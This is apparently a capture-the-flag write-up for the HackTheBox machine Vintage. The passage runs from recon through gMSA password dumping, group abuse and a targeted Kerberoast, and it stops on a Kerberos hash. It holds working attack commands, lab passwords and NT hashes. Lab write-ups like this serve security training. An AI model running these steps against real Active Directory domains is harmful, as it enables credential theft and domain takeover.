---
title: HTB: Vintage
url: https://0xdf.gitlab.io/2025/04/26/htb-vintage.html
date: 2025-04-26T13:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: hackthebox, htb-vintage, ctf, nmap, assume-breach, active-directory, netexec, evil-winrm, bllodhound, bloodhound-python, bloodhound-ce, kerberos, pre-windows-2000, gmsa, klist, kinit, ldapsearch, bloodyad, genericwrite, addself, gettgt, targeted-kerberoast, targetedkerberoast-py, hashcat, password-spray, shared-credential, windows-credential-manager, dpapi, runascs, dpapi-py, impacket, rbcd, dcsync, protected-users, htb-ghost, htb-certified, htb-mist, htb-freelancer, htb-rebound, htb-administrator, oscp-plus-v3, cpts-like, python-uv
---

![Vintage](/img/vintage-cover.png)

Vintage is another pure AD box, this time at Hard level. I’ll start with creds, and use them to collect Bloodhound data, which shows a computer object that’s a member of the Pre-Windows 2000 Compatible Access group. This means I can guess it’s password, and use that machine to get the GMSA password for a service account. I’ll use that access to enable a disabled service account and perform a targeted Kerberoast attack on it. I’ll spray that password to get access as a user and the first flag. That user has a credential in Windows Credential Manager, which I’ll extract and decrypt from DPAPI to get an account with some administrative access. That user is positioned to add objects to a group that has resource based constrained delegation on the domain controller. I’ll add the computer object to the group and use it to get full domain access.

## Box Info

| Name | [Vintage](https://hackthebox.com/machines/vintage)  [Vintage](https://hackthebox.com/machines/vintage) [Play on HackTheBox](https://hackthebox.com/machines/vintage) |
| --- | --- |
| Release Date | [30 Nov 2024](https://twitter.com/hackthebox_eu/status/1862179686844911744) |
| Retire Date | 26 Apr 2025 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Vintage |
| Radar Graph | Radar chart for Vintage |
| First Blood User | 01:26:17[Embargo Embargo](https://app.hackthebox.com/users/267436) |
| First Blood Root | 03:16:52[kozmer kozmer](https://app.hackthebox.com/users/637320) |
| Creator | [Geiseric Geiseric](https://app.hackthebox.com/users/184611) |
| Scenario | As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account: P.Rosa / Rosaisbest123 |

## Recon

### nmap

`nmap` finds a bunch of open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.45
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-19 01:04 UTC
Nmap scan report for 10.10.11.45
Host is up (0.090s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49674/tcp open  unknown
50240/tcp open  unknown
50245/tcp open  unknown
50265/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds
oxdf@hacky$ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.45
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-19 01:09 UTC
Nmap scan report for 10.10.11.45
Host is up (0.089s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-18 18:09:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -7h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-18T18:10:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.91 seconds

```

Based on [these ports](/cheatsheets/os#windows-domain-controller) it looks like a Windows Domain Controller. The domain name `vintage.htb` is present, as well as the hostname DC01. I’ll add these to my `hosts` file (in the proper order):

```
10.10.11.45 DC01 DC01.vintage.htb vintage.htb 

```

### Initial Credentials

HackTheBox provides the following scenario associated with the Vintage machine:

As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account:  
P.Rosa / Rosaisbest123

I am given credentials for a low priv user (P.Rosa, password “Rosaisbest123”) at the start of the box. This is meant to reflect many real world pentests that start this way. I’ll try to verify they work over SMB, but they fail:

```

oxdf@hacky$ netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123
SMB         10.10.11.45     445    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.45     445    10.10.11.45      [-] 10.10.11.45\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED

```

`(NTLM:False)` shows that NTLM auth is disabled. I’ll try with Kerberos and it works:

```

oxdf@hacky$ netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123 

```

These only work on the full hostname because Windows and Kerberos care about this kind of thing:

```

oxdf@hacky$ netexec smb dc01 -u P.Rosa -p Rosaisbest123 -k
SMB         dc01            445    dc01             [*]  x64 (name:dc01) (domain:dc01) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01            445    dc01             [-] dc01\P.Rosa:Rosaisbest123 KDC_ERR_WRONG_REALM 
oxdf@hacky$ netexec smb vintage.htb -u P.Rosa -p Rosaisbest123 -k
SMB         vintage.htb     445    vintage          [*]  x64 (name:vintage) (domain:htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         vintage.htb     445    vintage          [-] htb\P.Rosa:Rosaisbest123 [Errno Connection error (HTB:88)] [Errno -3] Temporary failure in name resolution

```

Given that, I’ll want to prioritize things like:
- SMB shares
- Bloodhound (which includes most of the data from LDAP)
- ADCS

### SMB - TCP 445

SMB shows the default DC shares:

```

oxdf@hacky$ netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k --shares
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123 
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01             C$                              Default share
SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share 
SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon server share 

```

I’ll check them out to be sure, but nothing interesting here.

### Bloodhound

#### Collection

I didn’t expect `bloodhound` to work without setting it up for Kerberos auth (like I showed in [Ghost](/2025/04/05/htb-ghost.html#enumeration)), but it does:

```

oxdf@hacky$ bloodhound-ce-python -c all -d vintage.htb -u P.Rosa -p Rosaisbest123 -ns 10.10.11.45 --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: vintage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The resolution lifetime expired after 3.144 seconds: Server Do53:10.10.11.45@53 answered The DNS operation timed out.
INFO: Done in 00M 18S
INFO: Compressing output into 20250418185542_bloodhound.zip

```

It’s interesting to see two different computers in the output.

I’ll [start the Bloodhound CE docker container](/2025/03/15/htb-certified.html#setup) and load the data.

#### Analysis

I’ll add P.Rosa to the owned list, but they don’t have any interesting outbound control.

I noticed an extra computer in the collection, and that’s worth checking out in a CTF. The FS01.vintage.htb computer is a member of two groups:

![image-20250418155330138](/img/image-20250418155330138.png)

Domain Computers is typical, but Pre-Windows 2000 Compatible Access is interesting, and a [Microsoft defined group](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7a76a403-ed8d-4c39-adb7-a3255cab82c5). Being a Pre-Windows 2000 means that the machine password is likely the all lowercase hostname (without a trailing “$”). It works:

```

oxdf@hacky$ netexec ldap vintage.htb -u 'FS01$' -p fs01 -k
LDAP        vintage.htb     389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        vintage.htb     389    DC01             [+] vintage.htb\FS01$:fs01 

```

In a real environment with many computers, I wouldn’t be able to just notice one. In that case, I might find this looking at the GMSA01$ service account, and seeing that in addition to all the standard administrator groups, the FS01 also has `ReadGMSAPassword`:

![image-20250424084032768](/img/image-20250424084032768.png)

## Shell as C.Neri

### Auth as GMSA01$

#### via ldapsearch

On originally trying to dump the GMSA password, `netexec` fails, so I’ll move to other tools and show a couple. `ldapsearch` requires a Kerberos ticket to use Kerberos (rather than getting one like `netexec`). I’ll use `netexec` to generate the `krb5.conf` file:

```

oxdf@hacky$ netexec smb dc01.vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' -k --generate-krb5-file vintage-krb5.conf
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123 
oxdf@hacky$ cat vintage-krb5.conf 

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VINTAGE.HTB

[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
        default_domain = vintage.htb
    }

[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB

```

Now I can get a ticket with `kinit`:

```

oxdf@hacky$ echo "fs01" | kinit 'fs01$'
Password for fs01$@VINTAGE.HTB: 
oxdf@hacky$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: fs01$@VINTAGE.HTB

Valid starting       Expires              Service principal
04/18/2025 20:30:10  04/19/2025 06:30:10  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 04/19/2025 20:30:10

```

One method to dump the GMSA password is `ldapsearch` (`apt install ldap-utils`):

```

oxdf@hacky$ ldapsearch -LLL -H ldap://dc01.vintage.htb -Y GSSAPI -b 'DC=vintage,DC=htb' '(&(ObjectClass=msDS-GroupManagedServiceAccount))' msDS-ManagedPassword
SASL/GSSAPI authentication started
SASL username: fs01$@VINTAGE.HTB
SASL SSF: 256
SASL data security layer installed.
dn: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword:: AQAAACQCAAAQABIBFAIcAnAD4ZbsJ+Iox01E6O5Yg1KdfVVoSIvf2A8
 HU6QllZyjc8R1pth5d/bDfGFKt4aA3wXC6ekukHCTp12eNurVq5NM7ZbhqWZa93llPYulMIJGsZL2
 9Xm78umn1Efpkb7X7cGNVZ6+SASkMi0+p3twRHxF0eT+Ygcts/G60Xd5QR7A6yhzbDPmHfzjpR0v3
 tYDIg5BCqmeHchGpBseU2L4kMRh+dpbadSqk/i7POtn0UZRM8DdN6As5C2INuI7yVv9nitGl3HjIK
 JeyeLBQWNP8wD8BCVINT2bGqleN8VlK1Ze/cX3Em8nmCi9HvGyoXcTc3cT5bAXC2xZq3UXZSrxN1k
 AAKjWfqpRg/gsdewzNu0n35nhftnn7SUSwrB38bC8Us4YdnREc4Cpoic7xB63xAKrLZUuuK+GNTkH
 bvLHQk+m/PoGF6Sw2vMQUCBcrITSu2D6xEVd6yVQC54SExxOJSiGKGoCOA6/aMADARqO2QuCzqARp
 PdJpOLriDBzbcpVUVr2uNRfr9kxQs0jXypwUlbi4YmfpKBDEwpID92fuF555bsOqpA91j7J7GA5WG
 Iszhj4bFMAdRicsxR2sHuIsH1Z21kHaLgoH5Udu7a3hTuVtEeUanEYZMBGC6JjqGxVVGt5BodYkDX
 aWiSzyOlKOO+u1DNTv7EmnjC/JylSocLA6JQAAJTpQD7NCQAAlItwi8wJAAA=

# refldap://ForestDnsZones.vintage.htb/DC=ForestDnsZones,DC=vintage,DC=htb

# refldap://DomainDnsZones.vintage.htb/DC=DomainDnsZones,DC=vintage,DC=htb

# refldap://vintage.htb/CN=Configuration,DC=vintage,DC=htb

```

[This blog](https://malicious.link/posts/2022/ldapsearch-reference/) has a Python script that will decode that, which I’ll [run with `uv`](https://www.youtube.com/watch?v=G36QXtBXKBQ):

```

oxdf@hacky$ uv add --script gmsa.py impacket
Updated `gmsa.py`
oxdf@hacky$ uv run gmsa.py -b AQAAACQCAAAQABIBFAIcAnAD4ZbsJ+Iox01E6O5Yg1KdfVVoSIvf2A8HU6QllZyjc8R1pth5d/bDfGFKt4aA3wXC6ekukHCTp12eNurVq5NM7ZbhqWZa93llPYulMIJGsZL29Xm78umn1Efpkb7X7cGNVZ6+SASkMi0+p3twRHxF0eT+Ygcts/G60Xd5QR7A6yhzbDPmHfzjpR0v3tYDIg5BCqmeHchGpBseU2L4kMRh+dpbadSqk/i7POtn0UZRM8DdN6As5C2INuI7yVv9nitGl3HjIKJeyeLBQWNP8wD8BCVINT2bGqleN8VlK1Ze/cX3Em8nmCi9HvGyoXcTc3cT5bAXC2xZq3UXZSrxN1kAAKjWfqpRg/gsdewzNu0n35nhftnn7SUSwrB38bC8Us4YdnREc4Cpoic7xB63xAKrLZUuuK+GNTkHbvLHQk+m/PoGF6Sw2vMQUCBcrITSu2D6xEVd6yVQC54SExxOJSiGKGoCOA6/aMADARqO2QuCzqARpPdJpOLriDBzbcpVUVr2uNRfr9kxQs0jXypwUlbi4YmfpKBDEwpID92fuF555bsOqpA91j7J7GA5WGIszhj4bFMAdRicsxR2sHuIsH1Z21kHaLgoH5Udu7a3hTuVtEeUanEYZMBGC6JjqGxVVGt5BodYkDXaWiSzyOlKOO+u1DNTv7EmnjC/JylSocLA6JQAAJTpQD7NCQAAlItwi8wJAAA=
================================================================================
NTHash: b3a15bbdfb1c53238d4b50ea2c4d1178
================================================================================

```

#### via BloodyAD

The [BloodyAD](https://github.com/CravateRouge/bloodyAD) tool will also dump the hash. Interestingly, it doesn’t work with the build in Kerberos ticket:

```

oxdf@hacky$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: fs01$@VINTAGE.HTB

Valid starting       Expires              Service principal
04/18/2025 20:30:10  04/19/2025 06:30:10  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 04/19/2025 20:30:10
04/18/2025 20:34:26  04/19/2025 06:30:10  ldap/dc01@
        renew until 04/19/2025 20:30:10
        Ticket server: ldap/dc01@VINTAGE.HTB
oxdf@hacky$ bloodyAD -d vintage.htb --host dc01.vintage.htb -k get object 'gmsa01$' --attr msDS-ManagedPassword
Traceback (most recent call last):
  File "/home/oxdf/.local/bin/bloodyAD", line 10, in <module>
    sys.exit(main())
             ^^^^^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.12/site-packages/bloodyAD/main.py", line 223, in main
    for entry in output:
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.12/site-packages/bloodyAD/cli_modules/get.py", line 341, in object
    entries = conn.ldap.bloodysearch(target, attr=attr.split(","), raw=raw)
              ^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.12/site-packages/bloodyAD/network/config.py", line 132, in ldap
    self._ldap = Ldap(self)
                 ^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.12/site-packages/bloodyAD/network/ldap.py", line 122, in __init__
    raise ValueError(
ValueError: You should provide a -p 'password' or a kerberos ticket via '-k <keyfile_type>=./myticket'

```

But I can set it either as the `KRB5CCNAME` variable explicitly, or add it to the `-k` option:

```

oxdf@hacky$ KRB5CCNAME=/tmp/krb5cc_1000 bloodyAD -d vintage.htb --host dc01.vintage.htb -k get object 'gmsa01$' --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHWm2Hl39sN8YUq3hoDfBcLp6S6QcJOnXZ426tWrk0ztluGpZlr3eWU9i6Uwgkaxkvb1ebvy6afUR+mRvtftwY1Vnr5IBKQyLT6ne3BEfEXR5P5iBy2z8brRd3lBHsDrKHNsM+Yd/OOlHS/e1gMiDkEKqZ4dyEakGx5TYviQxGH52ltp1KqT+Ls862fRRlEzwN03oCzkLYg24jvJW/2eK0aXceMgol7J4sFBY0/zAPwEJUg1PZsaqV43xWUrVl79xfcSbyeYKL0e8bKhdxNzdxPlsBcLbFmrdRdlKvE3WQ==
oxdf@hacky$ bloodyAD -d vintage.htb --host dc01.vintage.htb -k ccache=/tmp/krb5cc_1000 get object gmsa01$  --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHWm2Hl39sN8YUq3hoDfBcLp6S6QcJOnXZ426tWrk0ztluGpZlr3eWU9i6Uwgkaxkvb1ebvy6afUR+mRvtftwY1Vnr5IBKQyLT6ne3BEfEXR5P5iBy2z8brRd3lBHsDrKHNsM+Yd/OOlHS/e1gMiDkEKqZ4dyEakGx5TYviQxGH52ltp1KqT+Ls862fRRlEzwN03oCzkLYg24jvJW/2eK0aXceMgol7J4sFBY0/zAPwEJUg1PZsaqV43xWUrVl79xfcSbyeYKL0e8bKhdxNzdxPlsBcLbFmrdRdlKvE3WQ==

```

Either way, it returns the hashes.

I can also just use the username and password with the `-k` flag, and it’ll handle getting the ticket:

```

oxdf@hacky$ bloodyAD -d vintage.htb --host dc01.vintage.htb -u 'fs01$' -p fs01 -k get object 'gmsa01$' --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHWm2Hl39sN8YUq3hoDfBcLp6S6QcJOnXZ426tWrk0ztluGpZlr3eWU9i6Uwgkaxkvb1ebvy6afUR+mRvtftwY1Vnr5IBKQyLT6ne3BEfEXR5P5iBy2z8brRd3lBHsDrKHNsM+Yd/OOlHS/e1gMiDkEKqZ4dyEakGx5TYviQxGH52ltp1KqT+Ls862fRRlEzwN03oCzkLYg24jvJW/2eK0aXceMgol7J4sFBY0/zAPwEJUg1PZsaqV43xWUrVl79xfcSbyeYKL0e8bKhdxNzdxPlsBcLbFmrdRdlKvE3WQ==

```

#### via Hacking netexec

As a member of the Domain Computers group, FS01 can read the GMSA password for the GMSA01$ service account. Typically `netexec` is the best way to do this (as shown on [HTB Mist](/2024/10/26/htb-mist.html#get-password-hash)), but it fails here:

```

oxdf@hacky$ netexec ldap vintage.htb -u 'FS01$' -p fs01 -k --gmsa
LDAP        vintage.htb     389    vintage.htb      [-] LDAPs connection to ldaps://vintage.htb failed - (104, 'ECONNRESET')
LDAP        vintage.htb     389    vintage.htb      [-] Even if the port is open, LDAPS may not be configured

```

It seems that LDAPS is not configured, and exits.

I can actually make this work by editing the `netexec` code. With my [uv install](https://www.youtube.com/watch?v=G36QXtBXKBQ) of `netexec`, the module is located in `~/.local/share/uv/tools/netexec/lib/python3.12/site-packages/nxc`. In `protocols/ldap.py`, there are 11 places where it sets the protocol to “ldaps” or “ldap” based on the port or if the GMSA flag is used:

```

oxdf@hacky$ grep 'gmsa or' protocols/ldap.py 
            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
            self.logger.extra["protocol"] = "LDAPS" if (self.args.gmsa or self.port == 636) else "LDAP"
            self.logger.extra["port"] = "636" if (self.args.gmsa or self.port == 636) else "389"
            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
            self.logger.extra["protocol"] = "LDAPS" if (self.args.gmsa or self.port == 636) else "LDAP"
            self.logger.extra["port"] = "636" if (self.args.gmsa or self.port == 636) else "389"
            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
            self.logger.extra["protocol"] = "LDAPS" if (self.args.gmsa or self.port == 636) else "LDAP"
            self.logger.extra["port"] = "636" if (self.args.gmsa or self.port == 636) else "389"
            proto = "ldaps" if (self.args.gmsa or self.port == 636) else "ldap"
            self.logger.extra["port"] = "636" if (self.args.gmsa or self.port == 636) else "389"

```

If I remove the “self.args.gmsa or” from each of those lines (or use `sed -i 's/self.args.gmsa or//g'`), that allows it to pick LDAP vs LDAPS based on the port. Then it works:

```

oxdf@hacky$ netexec ldap vintage.htb -u 'FS01$' -p fs01 -k --gmsa
LDAP        vintage.htb     389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        vintage.htb     389    DC01             [+] vintage.htb\FS01$:fs01 
LDAP        vintage.htb     389    DC01             [*] Getting GMSA Passwords
LDAP        vintage.htb     389    DC01             Account: gMSA01$              NTLM: b3a15bbdfb1c53238d4b50ea2c4d1178     PrincipalsAllowedToReadPassword: Domain Computers

```

My best guess is that having GMSA over LDAP is unusual in the real world, but I can’t say for sure.

#### Validate Auth

Regardless of how I got the hash, it works to auth on `dc01`:

```

oxdf@hacky$ netexec smb dc01.vintage.htb -u 'gmsa01$' -H 'b3a15bbdfb1c53238d4b50ea2c4d1178' -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\gmsa01$:b3a15bbdfb1c53238d4b50ea2c4d1178 

```

### Recover SVC\_SQL Account’s Password

#### Enumeration

The GMSA01$ account has `GenericWrite` and `AddSelf` permissions over the ServiceManagers group:

![image-20250418165256468](/img/image-20250418165256468.png)

That group has three members:

![image-20250418165331804](/img/image-20250418165331804.png)

It also has `GenericAll` over three service accounts:

![image-20250418165455073](/img/image-20250418165455073.png)

This means I can add GMSA01$ to the ServiceManagers group, and then either change the password of or do a targeted Kerberoast attack against any of these three accounts. I’ll note that the SVC\_SQL account is disabled:

![image-20250418165927050](/img/image-20250418165927050.png)

The path that works here is as follows:
- Add GMSA01$ to the ServiceManagers group.
- Enable the SVC\_SQL account.
- Targeted Kerberoast the all three SVC\_\* accounts to get a hash.
- Crack the hash with `hashcat` to recover any simple plaintext passwords.

#### Get TGT

The simplest way to get a TGT as GMSA01$ is using [Impacket’s](https://github.com/fortra/impacket) `getTGT.py` script:

```

oxdf@hacky$ getTGT.py -k -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 'vintage.htb/gmsa01$'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in gmsa01$.ccache

```

#### Add GMSA01$ to ServiceManagers

`bloodyAD` will add a user to a group. I can either get a TGT with `getTGT.py` and use similar syntax as above, or have `bloodyAD` get the TGT with the `-k` option. There’s one trick here, and that’s that I need to specify `-f rc4` to not use AES encryption, and that the `-p` is just the NTLM, not the LM:NTLM (like the help says):

```

oxdf@hacky$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'GMSA01$' -p b3a15bbdfb1c53238d4b50ea2c4d1178 -f rc4 add groupMember ServiceManagers 'GMSA01$'                                                        
[+] GMSA01$ added to ServiceManagers

```

#### Enable SVC\_SQL

To be able to kerberoast this account, it’ll need to be enabled. I’ll do that with `bloodyAD`. If I try to use the same TGT I used to add GMSA01$ to the ServiceManagers group, will fail with insufficient rights:

```

oxdf@hacky$ KRB5CCNAME=gmsa01\$.ccache bloodyAD -d vintage.htb -k --host "dc01.vintage.htb" remove uac svc_sql -f ACCOUNTDISABLE
Traceback (most recent call last):
  File "/home/oxdf/.local/bin/bloodyAD", line 10, in <module>
    sys.exit(main())
             ^^^^^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.12/site-packages/bloodyAD/main.py", line 210, in main
    output = args.func(conn, **params)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.12/site-packages/bloodyAD/cli_modules/remove.py", line 288, in uac
    conn.ldap.bloodymodify(
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.12/site-packages/bloodyAD/network/ldap.py", line 301, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb! Result code: "insufficientAccessRights" Reason: "b'00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00'"

```

That’s because I need to get a new TGT that will contain updated groups for GMSA01$. I can either re-run `getTGT.py`, or just use `-k`, `-u`, `-p`, and `-f`. Then `bloodyAD` will get a fresh TGT each time. So that’s:

```

oxdf@hacky$ getTGT.py -k -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 vintage.htb/gmsa01$
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in gmsa01$.ccache
oxdf@hacky$ KRB5CCNAME=gmsa01\$.ccache bloodyAD -d vintage.htb -k --host "dc01.vintage.htb" remove uac svc_sql -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl

```

Or:

```

oxdf@hacky$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'GMSA01$' -p b3a15bbdfb1c53238d4b50ea2c4d1178 -f rc4 remove uac svc_sql -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl

```

#### Targeted Kerberoast via targetedKerberoast.py

At first I had some issues getting this script to work, and I’ll still show how I worked around that with `bloodyAD` and `netexec`. But [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast) is much easier as it’s just one command and I don’t have to worry about setting (and unsetting) the SPN. I’ve installed it using `uv` (as shown in [this video](https://www.youtube.com/watch?v=G36QXtBXKBQ)).

```

oxdf@hacky$ KRB5CCNAME=gmsa01\$.ccache targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (svc_sql)
$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$5f4b79067897ac3be5a026f6d4a87562$a60d448976bffdafe6fae280f82175f7153aa1bdeee10d91739c910f7b5e4af8005c1cc1c1163b27338ce6c932de6eac38fa937b94b9ff1e0d0b4b54f0b7505813c171550d6f5886f6d3acf9d999ae441b2e65f98933b4a05ab7353f9093d95729df9e7f500641f395ee3a4459f3c523d9cd794419db0f2ad4fd346908cd7a4fac549a0b2ffbe8faad71811a340adeb03d560cfe4cbe79344b84ed1d70770bdd3a02fb800c6ea3771195308dfe0a0b678fc8a50094c8ab45666e8db3239146cb4ff0a77b265c0bd3541a3e0133d781c16d561c7e169cf9f9fcef4a356708468b7265d7a657f607de2ce4c3f97d8ef8b8224f62cafffb6e3d396502c1742d1d1249302097560f943fac43215bfb303c7d41aa8f2ccf698c9cd589639bd82f7a7c2208af33bfc47811e73d7b5c29dcd566542de62d0b7e717d73bc011ec85fb2df9c001fbd990c60a64d2628495abc6569be654dc8117340930aa2f763c60402ac1b60268e1994d51a0d7aaf051ba5c97940523af23263cf216679f03367a56f8eadd20c729b00fe7a2ee473f8c9f6b376848a6b21c8d9a90ab5b0940f3eb58cb9f0d1de5b4dcbf7c129be9a3fcb7c3eff18705fbdeea42b815e3012113743dbdd05b38c332b818e3ec1148e21782bbba257434bad7bdc2e5a4ef446769ce2ad14ac7b8e679c2374d79992b5bae570ffe0f174c6b5b008928b578f040cedb02012472bf4ef9b9a1066c1f7a82801f3cb05348a8fa96af8db450317e34cd076aa9b900e699703113a6fb1da100eee0811edda2c03d5489423009c8f139217ad6df3d18caf1705bb059db3da73fec6da3dd3b2b7ee61a8557a765fdafcc12c4dd8c98e30980dc729a21d82a4c5a257b0e05ee9e1f5eb78282a198232c7dbcf2c50b14f95c5740bdcc90357ed2c1945bd66e23ef89bace7e93b529d